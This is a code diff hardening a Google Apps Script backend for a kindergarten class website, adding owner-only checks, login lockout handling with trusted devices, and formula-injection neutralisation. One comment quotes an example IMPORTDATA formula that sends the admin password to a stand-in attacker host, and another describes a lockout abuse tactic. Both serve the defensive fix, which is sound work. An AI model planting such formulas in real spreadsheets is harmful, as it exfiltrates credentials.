@@ -20,14 +20,14 @@ const SONGS_FOLDER_ID = '1vurxReuOW0laMDw1xSSOqeM5zT0TCmBQ';
  * 取得或自動建立 Google Drive 中的 Acticity 資料夾
  * 優先讀取 Settings 設定或上層資料夾，並確保連結有效避免 404
  */
-function getActivityFolder() {
+function getActivityFolder_() {
   let customId = '';
   try {
-    const ss = getSpreadsheet();
+    const ss = getSpreadsheet_();
     if (ss) {
       const setSheet = ss.getSheetByName('Settings');
       if (setSheet) {
-        const settings = getSettingsObject(setSheet);
+        const settings = getSettingsObject_(setSheet);
         customId = settings.ACTIVITY_FOLDER_ID || '';
       }
     }
@@ -99,14 +99,17 @@ function getActivityFolder() {
  * 試算表自訂選單（開啟 Google 試算表時自動載入）
  */
 function onOpen() {
+  // 安全性：onOpen 是公開函式名稱（匿名者可經 google.script.run 呼叫）。先取得 UI：網頁環境沒有 UI，這裡會直接拋錯，
+  // 就不會往下執行任何工作表檢查或寫入。
+  const ui = SpreadsheetApp.getUi();
   try {
-    ensureAlbumSheetsExist();
+    ensureAlbumSheetsExist_();
   } catch (e) {
     console.warn('ensureAlbumSheetsExist in onOpen skipped: ' + e);
   }
 
   try {
-    SpreadsheetApp.getUi()
+    ui
       .createMenu('🌟 諾貝爾A班專屬功能')
       .addItem('📁 立即建立／檢查相簿工作表 (AlbumCategories 與 Albums)', 'menuEnsureAlbumSheets')
       .addItem('🔄 清除快取並強制重新整理', 'menuClearCache')
@@ -144,14 +147,16 @@ function menuSyncSongAccess() {
 }
 
 function menuEnsureAlbumSheets() {
-  const res = ensureAlbumSheetsExist();
-  SpreadsheetApp.getUi().alert('✅ ' + (res.message || '相簿工作表建立與同步完成！'));
+  const ui = SpreadsheetApp.getUi();   // 先取得 UI（網頁環境會在這裡失敗，不會執行下面的工作）
+  const res = ensureAlbumSheetsExist_();
+  ui.alert('✅ ' + (res.message || '相簿工作表建立與同步完成！'));
 }
 
 function menuClearCache() {
-  clearAppDataCache();
-  ensureAlbumSheetsExist();
-  SpreadsheetApp.getUi().alert('✅ 快取已清除，所有最新資料與工作表已同步！');
+  const ui = SpreadsheetApp.getUi();   // 先取得 UI（網頁環境會在這裡失敗，不會執行下面的工作）
+  clearAppDataCache_();
+  ensureAlbumSheetsExist_();
+  ui.alert('✅ 快取已清除，所有最新資料與工作表已同步！');
 }
 
 /**
@@ -171,7 +176,7 @@ function getBackupFolder_() {
  */
 function backupSpreadsheet_() {
   const folder = getBackupFolder_();
-  const ss = getSpreadsheet();
+  const ss = getSpreadsheet_();
   const stamp = Utilities.formatDate(new Date(), 'Asia/Taipei', 'yyyy-MM-dd_HHmm');
   const copy = DriveApp.getFileById(ss.getId()).makeCopy('3of3_backup_' + stamp, folder);
 
@@ -203,6 +208,22 @@ function isBackupRecent_() {
   return !!last && (Date.now() - last) < BACKUP_MIN_INTERVAL_DAYS * 86400000;
 }
 
+/**
+ * 只有擁有者本人（在 Apps Script 編輯器或試算表選單）能執行的函式用。
+ * 這類函式的名稱必須公開（編輯器的「執行」清單看不到私有函式），但匿名者可經 google.script.run 呼叫公開名稱：
+ * 網頁環境的 Session.getActiveUser() 對匿名者是空的，和部署者（擁有者）不同，這裡以此拒絕。
+ */
+function requireOwnerContext_() {
+  let active = '', effective = '';
+  try {
+    active = String(Session.getActiveUser().getEmail() || '');
+    effective = String(Session.getEffectiveUser().getEmail() || '');
+  } catch (e) {}
+  if (!active || !effective || active !== effective) {
+    throw new Error('這個函式只能由擁有者在 Apps Script 編輯器或試算表選單執行。');
+  }
+}
+
 function weeklyBackup() {
   if (isBackupRecent_()) {
     console.log('weeklyBackup 略過：距離上次備份不足 ' + BACKUP_MIN_INTERVAL_DAYS + ' 天');
@@ -227,6 +248,7 @@ function menuBackupNow() {
  * 重複執行是安全的：會先移除舊的同名觸發器再建立。
  */
 function setupWeeklyBackupTrigger() {
+  requireOwnerContext_();
   // 先立刻備份一次：資料夾 ID、權限、流程任何一環有問題都會在這裡拋錯，
   // 此時尚未建立觸發器，不會留下「每週都失敗」的排程。
   // 距離上次備份不足間隔時不重複備份（setupWeeklyBackupTrigger 也能被網頁呼叫，不得用來連續備份擠掉舊檔）
@@ -245,6 +267,13 @@ function setupWeeklyBackupTrigger() {
  * 失敗不影響網站：下一位使用者照舊現場讀取。
  */
 function warmAppDataCache() {
+  // 安全性：這個名稱公開（時間觸發器需要），匿名者可經 google.script.run 反覆呼叫來拖慢網站（每次都重讀整份試算表）。
+  // 240 秒內已經預熱過就略過；觸發器每 5 分鐘一次，不受影響。
+  try {
+    const guard = CacheService.getScriptCache();
+    if (guard.get('warm_recent')) return;
+    guard.put('warm_recent', '1', 240);
+  } catch (e) {}
   APP_DATA_FORCE_REFRESH_ = true;
   try {
     getAppData();
@@ -270,6 +299,7 @@ function warmAppDataCache() {
  * 建立「每 5 分鐘預熱快取」觸發器（試算表選單可按；重複執行安全：已存在就不再建立）。
  */
 function setupWarmCacheTrigger() {
+  requireOwnerContext_();
   const exists = ScriptApp.getProjectTriggers().some(function(t) {
     return t.getHandlerFunction() === 'warmAppDataCache';
   });
@@ -279,20 +309,22 @@ function setupWarmCacheTrigger() {
 }
 
 function menuSetupWarmCache() {
+  const ui = SpreadsheetApp.getUi();   // 先取得 UI（網頁環境會在這裡失敗，不會執行下面的工作）
   const res = setupWarmCacheTrigger();
-  SpreadsheetApp.getUi().alert(res.created
+  ui.alert(res.created
     ? '✅ 已啟用：每 5 分鐘自動預熱網頁資料快取，並已立即預熱一次。'
     : '✅ 預熱觸發器已存在，已立即預熱一次。');
 }
 
 function openWebApp() {
+  const ui = SpreadsheetApp.getUi();   // 先取得 UI（網頁環境會在這裡失敗）
   const url = 'https://script.google.com/macros/s/AKfycbx5JGeiSH2J1vkOu4rh9NPwFBWNSkn5PkHfY5o25t-K4WcOK8b3VQjXi-TqUOzS8TvdJg/exec';
   const html = '<div style="font-family:sans-serif;padding:16px;text-align:center;">' +
     '<h3 style="color:#E05362;margin-bottom:12px;">🍑 諾貝爾 A 班生活網</h3>' +
     '<p style="font-size:13px;color:#666;margin-bottom:16px;">網頁已部署完成，點擊下方按鈕即可開啟！</p>' +
     '<a href="' + url + '" target="_blank" style="display:inline-block;padding:10px 22px;background:#FF7A85;color:#fff;text-decoration:none;border-radius:12px;font-weight:bold;box-shadow:0 2px 6px rgba(255,122,133,0.4);">👉 開啟班級生活網</a>' +
     '</div>';
-  SpreadsheetApp.getUi().showModalDialog(HtmlService.createHtmlOutput(html).setWidth(380).setHeight(180), '諾貝爾 A 班生活網');
+  ui.showModalDialog(HtmlService.createHtmlOutput(html).setWidth(380).setHeight(180), '諾貝爾 A 班生活網');
 }
 
 /**
@@ -331,11 +363,11 @@ function doGet(e) {
 
   // 自動檢查相簿與分類工作表是否已建立。
   // getAppData 不在這裡檢查：快取命中時完全不碰試算表（開試算表偶爾卡 20 秒以上甚至更久，會拖累每位使用者），
-  // 快取未命中時 getAppData 自己會呼叫 ensureDatabaseInitialized 做同樣的檢查。
+  // 快取未命中時 getAppData 自己會呼叫 ensureDatabaseInitialized_ 做同樣的檢查。
   const skipEnsure = !!(e && e.parameter && (e.parameter.action === 'getAppData' || e.parameter.action === 'getCalendarIcs' || e.parameter.action === 'getTextMap'));
   if (!skipEnsure) {
     try {
-      ensureAlbumSheetsExist();
+      ensureAlbumSheetsExist_();
     } catch (err) {
       console.error('ensureAlbumSheetsExist in doGet failed: ' + err.toString());
     }
@@ -513,6 +545,27 @@ function buildIcs_(events, now) {
   return lines.map(icsFold_).join('\r\n') + '\r\n';
 }
 
+// ---------- 試算表公式注入防護（2026-10-23 紅隊檢查 M-3）----------
+// 寫進儲存格的文字如果以 = + - @（或 Tab、Enter）開頭，會被試算表當成公式執行：例如活動標題設成
+// =IMPORTDATA("https://攻擊者/?p="&Settings!B3) 就能把明文密碼外送。doPost 解析請求後，統一把所有動作的文字欄位
+// 前面加一個 '（試算表會把它當成「這是文字」的標記，儲存格顯示與讀回的值都不含這個撇號）。
+// 不處理的欄位：不會被寫進試算表、或必須保持原樣的值（密碼、裝置金鑰、冪等編號、上傳檔案內容 base64 可合法地以 + 開頭、
+// 檔案清單會存成 JSON 文字不會被當公式、英文對照的 changes／zhList 由 textCellSafe_ 自己處理，避免重複加撇號、
+// settings 與介面標題 titles 由各自的函式以純文字格式寫入，再加撇號會讓撇號變成內容的一部分）。
+const FORMULA_SKIP_KEYS_ = { action: 1, password: 1, idempotencyKey: 1, requestId: 1, deviceKey: 1, kind: 1, base64: 1, file: 1, files: 1, changes: 1, zhList: 1, settings: 1, titles: 1 };
+function neutralizeFormulas_(v, depth) {
+  depth = depth || 0;
+  if (typeof v === 'string') return /^[=+\-@\t\r]/.test(v) ? "'" + v : v;
+  if (depth > 4) return v;
+  if (Array.isArray(v)) return v.map(function(x) { return (typeof x === 'string' || Array.isArray(x)) ? neutralizeFormulas_(x, depth + 1) : x; });
+  if (v && typeof v === 'object') {
+    const out = {};
+    Object.keys(v).forEach(function(k) { out[k] = FORMULA_SKIP_KEYS_[k] ? v[k] : neutralizeFormulas_(v[k], depth + 1); });
+    return out;
+  }
+  return v;
+}
+
 /**
  * REST API POST 入口（支援 google.script.run 內部呼叫、GitHub Pages 跨域 iframe form 呼叫）
  */
@@ -530,6 +583,7 @@ function doPost(e) {
       postData = JSON.parse(e.postData.contents);
     }
 
+    postData = neutralizeFormulas_(postData);
     const action = postData.action;
     let result = { success: false, error: '未知 POST 動作' };
 
@@ -562,7 +616,7 @@ function doPost(e) {
     } else if (dupResult) {
       result = dupResult;   // 已處理過：直接回傳上次結果，不再執行
     } else if (action === 'verifyPassword') {
-      result = verifyPassword(postData.password);
+      result = verifyPassword(postData.password, postData.deviceKey);
     } else if (action === 'logout') {
       result = adminLogout(postData.password);
     } else if (action === 'checkSession') {
@@ -609,8 +663,6 @@ function doPost(e) {
       result = deleteDoc(postData.id || postData.docId, postData.password);
     } else if (action === 'updateSettings') {
       result = updateSettings(postData.settings, postData.password);
-    } else if (action === 'ensureAlbumSheets' || action === 'initAlbumSheets') {
-      result = ensureAlbumSheetsExist();
     } else if (action === 'uploadSong') {
       result = uploadSong(postData.meta, postData.file, postData.password);
     } else if (action === 'saveSong') {
@@ -623,7 +675,7 @@ function doPost(e) {
       result = adminSongSetAccess(postData.ids, postData.blocked, postData.password);
     } else if (action === 'batchUpdateSongDurations') {
       result = checkPassword(postData.password)
-        ? batchUpdateSongDurations(postData.durationsMap || postData.data || {})
+        ? batchUpdateSongDurations_(postData.durationsMap || postData.data || {})
         : authFail_();
     } else if (action === 'mapList') {
       result = adminMapList(postData.kind, postData.password);
@@ -722,7 +774,7 @@ function doPost(e) {
 /**
  * 取得試算表實例
  */
-function getSpreadsheet() {
+function getSpreadsheet_() {
   try {
     if (SPREADSHEET_ID) {
       return SpreadsheetApp.openById(SPREADSHEET_ID);
@@ -736,7 +788,7 @@ function getSpreadsheet() {
 /**
  * 清除 getAppData 雲端快取，確保寫入時立即生效
  */
-function clearAppDataCache() {
+function clearAppDataCache_() {
   try {
     const cache = CacheService.getScriptCache();
     cache.remove('app_data_v3');
@@ -770,10 +822,10 @@ function getAppData() {
       }
     } catch (e) {}
 
-    const ss = getSpreadsheet();
+    const ss = getSpreadsheet_();
     if (!ss) throw new Error('無法開啟 Google 試算表');
 
-    ensureDatabaseInitialized();
+    ensureDatabaseInitialized_();
 
     // 自動移轉 Events 欄位：將 category 改為 categoryMajor，並在右側插入 categoryMinor
     let evtSheet = ss.getSheetByName('Events');
@@ -852,10 +904,10 @@ function getAppData() {
       }
     }
 
-    const events = getSheetDataAsObjects(ss.getSheetByName('Events'));
-    const menus = getSheetDataAsObjects(ss.getSheetByName('Menus'));
-    const spotlights = getSheetDataAsObjects(ss.getSheetByName('Spotlight'));
-    const docs = getSheetDataAsObjects(ss.getSheetByName('Docs'));
+    const events = getSheetDataAsObjects_(ss.getSheetByName('Events'));
+    const menus = getSheetDataAsObjects_(ss.getSheetByName('Menus'));
+    const spotlights = getSheetDataAsObjects_(ss.getSheetByName('Spotlight'));
+    const docs = getSheetDataAsObjects_(ss.getSheetByName('Docs'));
     // 自動補足或推導常用文件的副檔名 (PDF, DOCX, XLSX, PPTX 等)
     docs.forEach(function(doc) {
       if (!doc.fileExtension) {
@@ -883,7 +935,7 @@ function getAppData() {
     });
     // 一份文件多個檔案：files 欄（JSON）解析成陣列；沒有就是空陣列（舊式單檔文件）
     docs.forEach(function(d) { d.files = parseDocFiles_(d.files); });
-    const settings = getSettingsObject(ss.getSheetByName('Settings'));
+    const settings = getSettingsObject_(ss.getSheetByName('Settings'));
 
     // 確保 DocCategories 工作表存在
     let docCatSheet = ss.getSheetByName('DocCategories');
@@ -900,7 +952,7 @@ function getAppData() {
       ];
       docCatSheet.getRange(2, 1, defaultCats.length, 1).setValues(defaultCats);
     }
-    const docCategories = getSheetDataAsObjects(docCatSheet).map(row => row.categoryName).filter(Boolean);
+    const docCategories = getSheetDataAsObjects_(docCatSheet).map(row => row.categoryName).filter(Boolean);
 
     // 確保 EventTargets 工作表存在
     let evTargetSheet = ss.getSheetByName('EventTargets');
@@ -925,7 +977,7 @@ function getAppData() {
       ];
       evTargetSheet.getRange(2, 1, defaultTargets.length, 2).setValues(defaultTargets);
     }
-    const eventTargets = getSheetDataAsObjects(evTargetSheet).filter(row => row.targetName);
+    const eventTargets = getSheetDataAsObjects_(evTargetSheet).filter(row => row.targetName);
 
     // 確保 EventCategories 工作表存在 (大項)
     let evCatSheet = ss.getSheetByName('EventCategories');
@@ -943,7 +995,7 @@ function getAppData() {
       ];
       evCatSheet.getRange(2, 1, defaultCats.length, 1).setValues(defaultCats);
     }
-    let eventCategoriesMajor = getSheetDataAsObjects(evCatSheet).map(row => row.categoryName).filter(Boolean);
+    let eventCategoriesMajor = getSheetDataAsObjects_(evCatSheet).map(row => row.categoryName).filter(Boolean);
     
     // 確保 EventCategoriesMinor 工作表存在 (細項)
     let evCatMinorSheet = ss.getSheetByName('EventCategoriesMinor');
@@ -960,7 +1012,7 @@ function getAppData() {
       ];
       evCatMinorSheet.getRange(2, 1, defaultCatsMinor.length, 1).setValues(defaultCatsMinor);
     }
-    let eventCategoriesMinor = getSheetDataAsObjects(evCatMinorSheet).map(row => row.categoryName).filter(Boolean);
+    let eventCategoriesMinor = getSheetDataAsObjects_(evCatMinorSheet).map(row => row.categoryName).filter(Boolean);
 
     // 自動補齊與去重大項與細項，包含既有活動曾出現之項目（如「親職活動」），防止前端下拉選單遺漏
     const majorSet = new Set(eventCategoriesMajor.map(c => String(c).trim()).filter(Boolean));
@@ -992,7 +1044,7 @@ function getAppData() {
       ];
       albumCatSheet.getRange(2, 1, defaultAlbumCats.length, 1).setValues(defaultAlbumCats);
     }
-    let albumCategories = getSheetDataAsObjects(albumCatSheet).map(row => row.categoryName).filter(Boolean);
+    let albumCategories = getSheetDataAsObjects_(albumCatSheet).map(row => row.categoryName).filter(Boolean);
     if (!albumCategories || albumCategories.length === 0) {
       albumCategories = ['班級主題', '全園活動', '親職活動', '節慶活動', '幸福廚房', '健康檢查', '戶外踏訪', '日常生活'];
     }
@@ -1008,7 +1060,7 @@ function getAppData() {
     let actFolderUrl = '';
     let actFolderId = '';
     try {
-      const actFolder = getActivityFolder();
+      const actFolder = getActivityFolder_();
       if (actFolder) {
         actFolderUrl = actFolder.getUrl();
         actFolderId = actFolder.getId();
@@ -1029,7 +1081,7 @@ function getAppData() {
     let songList = [];
     let songCategories = [];
     try {
-      let songData = getSongsData();
+      let songData = getSongsData_();
       songList = songData.songs;
       songCategories = songData.categories;
 
@@ -1045,9 +1097,9 @@ function getAppData() {
         }
       }
       if (hasInvalidDuration) {
-        const syncRes = syncAllSongDurations(false);
+        const syncRes = syncAllSongDurations_(false);
         if (syncRes && syncRes.updatedCount > 0) {
-          songData = getSongsData();
+          songData = getSongsData_();
           songList = songData.songs;
           songCategories = songData.categories;
         }
@@ -1061,7 +1113,7 @@ function getAppData() {
     let themeSemesters = [];
     let themeOverviews = {};
     try {
-      const themeData = getThemesData();
+      const themeData = getThemesData_();
       themeList = themeData.themes;
       themeSemesters = themeData.semesters;
       themeOverviews = themeData.overviews || {};
@@ -1294,7 +1346,7 @@ function ensureNameMapSheet_(ss) {
  * 絕不覆蓋或清除任何一列的 en。回傳 { added, total, missingEn, issues, unused }。
  */
 function syncNameMap_() {
-  const ss = getSpreadsheet();
+  const ss = getSpreadsheet_();
   const collected = collectNameSources_(ss);
   const ens = ensureNameMapSheet_(ss);
   const sh = ens.sheet, cols = ens.cols;
@@ -1348,7 +1400,7 @@ function syncNameMap_() {
   });
   collected.order.forEach(function(n) { collected.names[n].notes.forEach(function(msg) { report.issues.push(n + '：' + msg); }); });
   dupZh.forEach(function(n) { report.issues.push(n + '：對照表中出現重複的列，只有第一列會生效，請刪除多餘的列'); });
-  clearAppDataCache();
+  clearAppDataCache_();
   return report;
 }
 
@@ -1523,7 +1575,7 @@ function textCellSafe_(v) {
  * 回傳 { added, total, missingEn, withDraft, unused, capped }。
  */
 function syncTextMap_() {
-  const ss = getSpreadsheet();
+  const ss = getSpreadsheet_();
   const data = getAppDataFresh_();
   const collected = collectTextSources_(data);
   const ens = ensureTextMapSheet_(ss);
@@ -1594,7 +1646,7 @@ function draftTextMap_(limit) { return draftMap_('text', limit); }
 /** 通用版：kind 是 'text' 或 'name'。只處理「目前有使用、en 與 draft 都空白」的列，只寫 draft 欄。 */
 function draftMap_(kind, limit) {
   const cfg = MAP_KINDS_[kind];
-  const ss = getSpreadsheet();
+  const ss = getSpreadsheet_();
   const ens = cfg.ensure(ss);
   const sh = ens.sheet, cols = ens.cols;
   const width = Math.max(sh.getLastColumn(), cfg.headers.length);
@@ -1636,7 +1688,7 @@ function adoptTextDrafts_(onlyList) { return adoptMapDrafts_('text', onlyList); 
 function adoptMapDrafts_(kind, onlyList) {
   const cfg = MAP_KINDS_[kind];
   const only = Array.isArray(onlyList) ? onlyList.reduce(function(acc, z) { acc[cfg.norm(z)] = true; return acc; }, {}) : null;
-  const ss = getSpreadsheet();
+  const ss = getSpreadsheet_();
   const ens = cfg.ensure(ss);
   const sh = ens.sheet, cols = ens.cols;
   const width = Math.max(sh.getLastColumn(), cfg.headers.length);
@@ -1733,9 +1785,9 @@ function getTextMap() {
   try {
     const cached = cacheGetLarge_(TEXT_MAP_CACHE_KEY);
     if (cached) return JSON.parse(cached);
-    const ss = getSpreadsheet();
+    const ss = getSpreadsheet_();
     if (!ss) throw new Error('no spreadsheet');
-    const settings = getSettingsObject(ss.getSheetByName('Settings'));
+    const settings = getSettingsObject_(ss.getSheetByName('Settings'));
     const map = getTextMapForApp_(ss, textSettingTrue_(settings.SHOW_MACHINE_TRANSLATION));
     const result = { success: true, map: map, count: Object.keys(map).length };
     cachePutLarge_(TEXT_MAP_CACHE_KEY, JSON.stringify(result), APP_DATA_CACHE_TTL_SEC);
@@ -1811,7 +1863,7 @@ const MAP_KINDS_ = {
   text: { sheet: TEXT_MAP_SHEET, headers: TEXT_MAP_HEADERS, norm: normalizeText_, maxRows: TEXT_MAP_MAX_ROWS, maxLen: TEXT_MAP_MAX_LEN, hasDraft: true,
           ensure: ensureTextMapSheet_, clear: clearTextMapCache_, unused: TEXT_MAP_UNUSED },
   name: { sheet: NAME_MAP_SHEET, headers: NAME_MAP_HEADERS, norm: normalizeName_, maxRows: 2000, maxLen: NAME_MAP_MAX_LEN, hasDraft: true,
-          ensure: ensureNameMapSheet_, clear: clearAppDataCache, unused: '（目前沒有使用）' }
+          ensure: ensureNameMapSheet_, clear: clearAppDataCache_, unused: '（目前沒有使用）' }
 };
 
 function mapKind_(kind) {
@@ -1824,7 +1876,7 @@ function mapSanitizeEn_(v, maxLen) {
 }
 
 function mapReadAll_(cfg) {
-  const ens = cfg.ensure(getSpreadsheet());
+  const ens = cfg.ensure(getSpreadsheet_());
   const sh = ens.sheet, cols = ens.cols;
   const width = Math.max(sh.getLastColumn(), cfg.headers.length);
   const n = sh.getLastRow() > 1 ? sh.getLastRow() - 1 : 0;
@@ -2015,7 +2067,7 @@ function adminMapStatus(password) {
   if (!checkPassword(password)) return authFail_();
   try {
     const out = { success: true };
-    const ss = getSpreadsheet();
+    const ss = getSpreadsheet_();
     ['text', 'name'].forEach(function(kind) {
       const cfg = MAP_KINDS_[kind];
       const all = mapReadAll_(cfg);
@@ -2131,7 +2183,7 @@ function setAlbumCoverCandidates_(albumsSheet, albumId, ids) {
 
 /** 為 Albums 表中所有相簿（重新）建立封面候選。回傳 { updated, skipped, errors } */
 function rebuildAlbumCoverCandidates_() {
-  const ss = getSpreadsheet();
+  const ss = getSpreadsheet_();
   const sheet = ss ? ss.getSheetByName('Albums') : null;
   const res = { updated: 0, skipped: 0, errors: [] };
   if (!sheet) return res;
@@ -2151,7 +2203,7 @@ function rebuildAlbumCoverCandidates_() {
       res.errors.push(albumId + ': ' + e);
     }
   }
-  clearAppDataCache();
+  clearAppDataCache_();
   return res;
 }
 
@@ -2174,7 +2226,7 @@ function menuRebuildCoverCandidates() {
  */
 function getAlbums() {
   try {
-    const ss = getSpreadsheet();
+    const ss = getSpreadsheet_();
     let albumsSheet = ss ? ss.getSheetByName('Albums') : null;
     if (ss && !albumsSheet) {
       albumsSheet = ss.insertSheet('Albums');
@@ -2183,7 +2235,7 @@ function getAlbums() {
     }
 
     // 1. 讀取 Google Sheets Albums 表既有資料
-    const sheetAlbums = albumsSheet ? getSheetDataAsObjects(albumsSheet) : [];
+    const sheetAlbums = albumsSheet ? getSheetDataAsObjects_(albumsSheet) : [];
     const sheetAlbumMap = new Map();
     sheetAlbums.forEach(alb => {
       if (alb.id) sheetAlbumMap.set(String(alb.id), alb);
@@ -2351,10 +2403,10 @@ function isRegisteredAlbumId_(id) {
     }
   } catch (e) {}
   try {
-    const ss = getSpreadsheet();
+    const ss = getSpreadsheet_();
     const sheet = ss && ss.getSheetByName('Albums');
     if (!sheet) return false;
-    return getSheetDataAsObjects(sheet).some(function(r) { return String(r.id || '').trim() === id; });
+    return getSheetDataAsObjects_(sheet).some(function(r) { return String(r.id || '').trim() === id; });
   } catch (e) {
     return false;
   }
@@ -2434,7 +2486,7 @@ function recountAlbum(albumId, password) {
   const id = String(albumId || '').trim();
   if (!/^[A-Za-z0-9_-]{10,100}$/.test(id)) return { success: false, error: '相簿編號不正確' };
   try {
-    const ss = getSpreadsheet();
+    const ss = getSpreadsheet_();
     const sheet = ss && ss.getSheetByName('Albums');
     if (!sheet) return { success: false, error: '找不到 Albums 工作表' };
     const data = sheet.getDataRange().getValues();
@@ -2628,7 +2680,7 @@ function initAlbumUpload(param1, param2, param3) {
     const folderUrl = targetFolder.getUrl();
 
     // 立即登記至 Google Sheets Albums 表
-    const ss = getSpreadsheet();
+    const ss = getSpreadsheet_();
     let existingCount = 0;
     let existingCover = '';
     if (ss) {
@@ -2681,7 +2733,7 @@ function initAlbumUpload(param1, param2, param3) {
       }
     }
 
-    clearAppDataCache();
+    clearAppDataCache_();
 
     return {
       success: true,
@@ -2750,7 +2802,7 @@ function uploadPhotosChunk(param1, param2, param3, param4) {
 
     // 更新 Albums 試算表
     let currentTotal = 0;
-    const ss = getSpreadsheet();
+    const ss = getSpreadsheet_();
     if (ss) {
       const albumsSheet = ss.getSheetByName('Albums');
       if (albumsSheet) {
@@ -2815,7 +2867,7 @@ function uploadPhotosChunk(param1, param2, param3, param4) {
       } catch (e) {
         console.warn('Precise count calculation skipped: ' + e);
       }
-      clearAppDataCache();
+      clearAppDataCache_();
     }
 
     return {
@@ -2923,7 +2975,7 @@ function uploadPhotosToAlbum(param1, param2, param3, param4, param5, param6) {
     }
 
     // 同步登記至 Google Sheets Albums 表
-    const ss = getSpreadsheet();
+    const ss = getSpreadsheet_();
     if (ss) {
       let albumsSheet = ss.getSheetByName('Albums');
       if (!albumsSheet) {
@@ -2970,7 +3022,7 @@ function uploadPhotosToAlbum(param1, param2, param3, param4, param5, param6) {
         albumsSheet.appendRow(newRow);
       }
       try { setAlbumCoverCandidates_(albumsSheet, folderId, sampleCoverCandidates_(listAlbumImageEntries_(targetFolder))); } catch (candErr) { console.warn('Cover candidates skipped: ' + candErr); }
-      clearAppDataCache();
+      clearAppDataCache_();
     }
 
     return {
@@ -3000,7 +3052,7 @@ function saveAlbum(albumData, password) {
       return { success: false, error: '缺少相簿編號！' };
     }
 
-    const ss = getSpreadsheet();
+    const ss = getSpreadsheet_();
     let sheet = ss.getSheetByName('Albums');
     if (!sheet) {
       sheet = ss.insertSheet('Albums');
@@ -3055,7 +3107,7 @@ function saveAlbum(albumData, password) {
       console.warn('Drive folder rename warning: ' + driveErr);
     }
 
-    clearAppDataCache();
+    clearAppDataCache_();
     return {
       success: true,
       message: '相簿資訊已成功更新！'
@@ -3077,7 +3129,7 @@ function deleteAlbum(albumId, password) {
   }
 
   try {
-    const ss = getSpreadsheet();
+    const ss = getSpreadsheet_();
     const sheet = ss.getSheetByName('Albums');
     if (sheet) {
       const data = sheet.getDataRange().getValues();
@@ -3102,7 +3154,7 @@ function deleteAlbum(albumId, password) {
       console.warn('Trash drive folder warning: ' + e);
     }
 
-    clearAppDataCache();
+    clearAppDataCache_();
     return {
       success: true,
       message: '相簿已成功刪除！'
@@ -3314,7 +3366,7 @@ function uploadSpotlightImage(fileObj, password) {
   }
 
   try {
-    const folder = getActivityFolder();
+    const folder = getActivityFolder_();
     if (!folder) throw new Error('無法取得或建立 Google Drive Acticity 資料夾！');
 
     const decodedBytes = Utilities.base64Decode(fileObj.base64);
@@ -3352,7 +3404,7 @@ function uploadSpotlightImage(fileObj, password) {
  */
 function getActivityImages() {
   try {
-    const folder = getActivityFolder();
+    const folder = getActivityFolder_();
     if (!folder) return { success: false, error: '找不到或無法開啟 Acticity 資料夾', files: [] };
 
     const files = folder.getFiles();
@@ -3386,6 +3438,13 @@ const AUTH_MAX_FAILS = 5;                   // 連續輸錯幾次後鎖定
 const AUTH_LOCK_SEC = 900;                  // 鎖定時間（秒）= 15 分鐘
 const AUTH_ERROR_MSG = '登入已逾時或無效，請重新登入。';
 const AUTH_MIN_PASSWORD_LENGTH = 10;        // 後台變更密碼時的最短長度
+// 受信任裝置（2026-10-23 紅隊檢查 M-2）：登入鎖定是全站共用的（GAS 取不到來源 IP），攻擊者每 15 分鐘故意輸錯 5 次，
+// 老師就永遠登不進去。登入成功的裝置會拿到一把「裝置金鑰」（存在該瀏覽器的 localStorage，伺服器只存雜湊）；
+// 鎖定期間，帶著有效裝置金鑰又輸入正確密碼的裝置仍可登入。沒有裝置金鑰的攻擊者照舊被鎖定。
+const AUTH_DEVICE_TTL_MS = 90 * 86400000;   // 裝置金鑰 90 天不用就失效（每次登入延長）
+const AUTH_DEVICE_MAX = 10;                 // 最多記住幾台裝置（超過就擠掉最舊的）
+const AUTH_TRUSTED_MAX_FAILS = 20;          // 受信任裝置的累計錯誤上限（裝置金鑰外洩時，不能無限猜密碼）
+const AUTH_DEVICES_KEY = 'TRUSTED_DEVICES';
 
 /** 所有寫入端點驗證失敗時的統一回應；前端看到 authExpired 會自動回到登入畫面 */
 function authFail_() {
@@ -3396,9 +3455,9 @@ function authFail_() {
 function verifyAdminPassword_(password) {
   if (!password) return false;
   try {
-    const ss = getSpreadsheet();
+    const ss = getSpreadsheet_();
     const sheet = ss.getSheetByName('Settings');
-    const settings = getSettingsObject(sheet);
+    const settings = getSettingsObject_(sheet);
     const real = String(settings.ADMIN_PASSWORD || '').trim();
     // 試算表沒設密碼 → 一律拒絕（不退回任何內建預設密碼）
     if (!real) return false;
@@ -3453,22 +3512,26 @@ function checkPassword(token) {
  * 登入：驗證管理員密碼並發給 token。
  * 連續輸錯 AUTH_MAX_FAILS 次後鎖定 AUTH_LOCK_SEC 秒，鎖定期間連正確密碼也不接受，且不再累計。
  */
-function verifyPassword(password) {
+function verifyPassword(password, deviceKey) {
   const cache = CacheService.getScriptCache();
   const fails = Number(cache.get('login_fails') || 0);
-  if (fails >= AUTH_MAX_FAILS) {
+  const trusted = isTrustedDevice_(deviceKey);
+  // 沒有（有效）裝置金鑰：照原本規則，連續錯 5 次就鎖定；受信任裝置：累計錯誤超過上限才鎖定
+  if (fails >= (trusted ? AUTH_TRUSTED_MAX_FAILS : AUTH_MAX_FAILS)) {
     return { success: false, locked: true, error: '嘗試次數過多，為保護帳號已暫時鎖定，請 15 分鐘後再試。' };
   }
   if (verifyAdminPassword_(password)) {
-    cache.remove('login_fails');
-    return { success: true, token: issueToken_(), expiresInSec: AUTH_TOKEN_TTL_SEC, message: '驗證成功' };
+    // 鎖定中（有人在猜密碼）時，受信任裝置登入成功不能替別人解鎖：只有還沒鎖定時才歸零
+    if (fails < AUTH_MAX_FAILS) cache.remove('login_fails');
+    return { success: true, token: issueToken_(), expiresInSec: AUTH_TOKEN_TTL_SEC, message: '驗證成功', deviceKey: trustDevice_(deviceKey) };
   }
   const now = fails + 1;
   cache.put('login_fails', String(now), AUTH_LOCK_SEC);
-  const left = AUTH_MAX_FAILS - now;
+  const limit = trusted ? AUTH_TRUSTED_MAX_FAILS : AUTH_MAX_FAILS;
+  const left = limit - now;
   return {
     success: false,
-    error: left > 0 ? ('密碼不正確（再錯 ' + left + ' 次將鎖定 15 分鐘）') : '嘗試次數過多，為保護帳號已暫時鎖定，請 15 分鐘後再試。',
+    error: left > 0 ? ('密碼不正確' + (trusted ? '' : '（再錯 ' + left + ' 次將鎖定 15 分鐘）')) : '嘗試次數過多，為保護帳號已暫時鎖定，請 15 分鐘後再試。',
     locked: left <= 0
   };
 }
@@ -3482,6 +3545,47 @@ function adminLogout(token) {
 /** 檢查目前 token 是否仍有效（前端開頁時用來確認登入狀態） */
 function adminCheckSession(token) {
